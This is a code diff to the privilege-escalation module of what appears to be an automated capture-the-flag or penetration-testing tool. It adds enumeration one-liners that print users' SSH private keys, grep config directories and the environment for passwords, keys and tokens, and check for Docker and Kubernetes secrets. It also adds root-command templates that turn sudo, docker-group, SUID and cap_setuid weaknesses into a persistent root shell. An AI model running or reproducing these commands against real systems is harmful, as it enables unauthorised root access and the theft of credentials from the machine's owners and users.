@@ -20,15 +20,24 @@ from ..core.state import Credential, Finding
 from .flags import find_flags
 from .postexploit import loot
 
-# The enumeration commands run over the session. Bare, portable, read-only.
+# The enumeration commands run over the session — a curated "mini-linpeas" of
+# portable, read-only shell one-liners whose output feeds the existing loot parsers.
 ENUM_COMMANDS = [
     "id",
     "sudo -n -l 2>/dev/null",
     "uname -a",
     "cat /etc/os-release 2>/dev/null",
-    "find / -perm -4000 -type f 2>/dev/null",
+    "find / -perm -4000 -type f 2>/dev/null",           # SUID
+    "find / -perm -2000 -type f 2>/dev/null",           # SGID
     "getcap -r / 2>/dev/null",
-    "cat /etc/crontab 2>/dev/null",
+    "cat /etc/crontab 2>/dev/null; ls -la /etc/cron.d /etc/cron.daily 2>/dev/null",
+    "ls -la /var/run/docker.sock /.dockerenv 2>/dev/null; grep -i cap /proc/1/status 2>/dev/null",
+    "ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null",
+    "ls -la /root/.ssh /home/*/.ssh 2>/dev/null; cat /home/*/.ssh/id_* 2>/dev/null",
+    "find / -writable -type f 2>/dev/null | grep -vE '^/(proc|sys|dev|run)' | head -40",
+    "grep -rhiE 'password|passwd|secret|api[_-]?key' /var/www /etc 2>/dev/null | head -25",
+    "env 2>/dev/null | grep -iE 'pass|key|token|secret'",
+    "cat /proc/version 2>/dev/null",
 ]
 
 _ROOT_PROOF = "/root/root.txt"
@@ -40,6 +49,9 @@ class EscalationResult:
     method: str = ""
     evidence: str = ""
     root_flag: str | None = None
+    # A command template ({CMD}) that runs an arbitrary command as root via the
+    # matched vector — used to build a persistent RootSession after escalation.
+    root_run: str = ""
     findings: list[Finding] = field(default_factory=list)
     credentials: list[Credential] = field(default_factory=list)
 
@@ -96,12 +108,21 @@ _SUDO_ALL_RE = re.compile(r"\(\s*ALL(?:\s*:\s*ALL)?\s*\)\s*(?:NOPASSWD:\s*)?ALL\
 _NOPASSWD_BIN_RE = re.compile(r"NOPASSWD:\s*(.+)", re.IGNORECASE)
 
 
+# root-command templates ({CMD}) per vector, for a persistent RootSession.
+_SHELL_ROOT_RUN = {
+    "bash": 'sudo bash -c "{CMD}"', "sh": 'sudo sh -c "{CMD}"',
+    "python3": 'sudo python3 -c \'import os;os.system("{CMD}")\'',
+    "python": 'sudo python -c \'import os;os.system("{CMD}")\'',
+}
+
+
 def attempt_escalation(session: Session, enum_output: str, findings: list[Finding],
                        *, runner=None) -> EscalationResult:
     """Try the curated escalations that match, proving root via /root/root.txt."""
     # 1) Full sudo (ALL) -> read the proof directly.
     if _SUDO_ALL_RE.search(enum_output):
-        r = _try(session, f"sudo cat {_ROOT_PROOF}", "full sudo (ALL)", runner)
+        r = _try(session, f"sudo cat {_ROOT_PROOF}", "full sudo (ALL)", runner,
+                 root_run='sudo sh -c "{CMD}"')
         if r.escalated:
             return r
 
@@ -111,7 +132,8 @@ def attempt_escalation(session: Session, enum_output: str, findings: list[Findin
         for token in re.split(r"[,\s]+", m):
             binary = token.rsplit("/", 1)[-1].strip()
             if binary in reads:
-                r = _try(session, reads[binary], f"sudo NOPASSWD {binary}", runner)
+                r = _try(session, reads[binary], f"sudo NOPASSWD {binary}", runner,
+                         root_run=_SHELL_ROOT_RUN.get(binary, ""))
                 if r.escalated:
                     return r
 
@@ -119,7 +141,9 @@ def attempt_escalation(session: Session, enum_output: str, findings: list[Findin
     id_line = next((ln for ln in enum_output.splitlines() if "groups=" in ln), "")
     for group, cmd in _GROUP_ESCALATIONS.items():
         if group in id_line.lower():
-            r = _try(session, cmd, f"'{group}' group", runner)
+            root_run = ('docker run -v /:/mnt --rm alpine chroot /mnt sh -c "{CMD}"'
+                        if group == "docker" else "")
+            r = _try(session, cmd, f"'{group}' group", runner, root_run=root_run)
             if r.escalated:
                 return r
 
@@ -129,7 +153,8 @@ def attempt_escalation(session: Session, enum_output: str, findings: list[Findin
         if m and m.group(1).rsplit("/", 1)[-1] in _SUID_SHELLS:
             path = m.group(1)
             r = _try(session, f"{path} -p -c 'cat {_ROOT_PROOF}'",
-                     f"SUID {path.rsplit('/', 1)[-1]}", runner)
+                     f"SUID {path.rsplit('/', 1)[-1]}", runner,
+                     root_run=f'{path} -p -c "{{CMD}}"')
             if r.escalated:
                 return r
 
@@ -144,19 +169,22 @@ def attempt_escalation(session: Session, enum_output: str, findings: list[Findin
         tmpl = _CAP_SCRIPTABLE.get(base) or _CAP_SCRIPTABLE.get(binary)
         if tmpl:
             cmd = tmpl.replace("{PATH}", path).replace("{P}", _ROOT_PROOF)
-            r = _try(session, cmd, f"cap_setuid on {binary}", runner)
+            root_run = (f"{path} -c 'import os;os.setuid(0);os.system(\"{{CMD}}\")'"
+                        if base in ("python",) else "")
+            r = _try(session, cmd, f"cap_setuid on {binary}", runner, root_run=root_run)
             if r.escalated:
                 return r
 
     return EscalationResult(False, evidence="no auto-escalation vector matched")
 
 
-def _try(session: Session, command: str, method: str, runner) -> EscalationResult:
+def _try(session: Session, command: str, method: str, runner, *,
+         root_run: str = "") -> EscalationResult:
     out = session.run(command, runner=runner)
     flags = find_flags(out, include_bare_hex=True)
     if flags:
         return EscalationResult(True, method=method, evidence=out.strip()[:200],
-                                root_flag=flags[0])
+                                root_flag=flags[0], root_run=root_run)
     # A 32-hex-looking token is the strongest proof, but even a non-error read is a
     # signal; only claim success when we actually recovered a flag-shaped value.
     return EscalationResult(False, method=method, evidence=out.strip()[:200])
